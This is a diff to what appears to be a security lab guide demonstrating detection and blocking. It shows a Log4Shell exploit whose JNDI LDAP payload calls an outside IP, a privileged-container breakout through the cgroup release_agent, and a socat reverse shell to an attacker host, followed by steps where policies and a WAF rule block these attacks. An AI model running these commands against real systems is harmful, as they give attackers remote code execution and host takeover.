@@ -81,7 +81,6 @@ Copy exploiting app to the VM
 Download jdk-8u20-linux-x64 from https://www.oracle.com/de/java/technologies/javase/javase8-archive-downloads.html
 
 ```
-mkdir ~/target
 scp ~/Downloads/jdk-8u20-linux-x64.tar.gz ec2-user@<IP>:~/
 scp -r exploiting-app/* ec2-user@<IP>:~/
 ```
@@ -118,7 +117,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 Run attack
 
 ```
-curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<IP>:1389/a}'
+curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
 ```
 
 Install kubectl
@@ -149,17 +148,26 @@ capsh --print
 Try to break out of the container and create remote shell on host (see also https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged)
 
 ```
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+# Mounts the RDMA cgroup controller and create a child cgroup
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
+# Enables cgroup notifications on release of the "x" cgroup
 echo 1 > /tmp/cgrp/x/notify_on_release
 
+# Finds path of OverlayFS mount for container
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 
+# Sets release_agent to /{overlay_fs_host_path}/cmd
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
+# create command to execute
 echo '#!/bin/bash' > /cmd
 echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444" >> /cmd
 chmod a+x /cmd
+
+# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
+# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
+# The script on the host will execute after /bin/sh exits 
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
@@ -259,7 +267,7 @@ See that the remote shell does not work anymore and the connection was denied in
 Execute
 
 ```
-curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<IP>:1389/a}'
+curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
 ```
 
 and see the security event.
@@ -269,7 +277,7 @@ Add a log4shell WAF rule to block the log4shell attack.
 Execute
 
 ```
-curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<IP>:1389/a}'
+curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
 ```
 
 and see the security event.
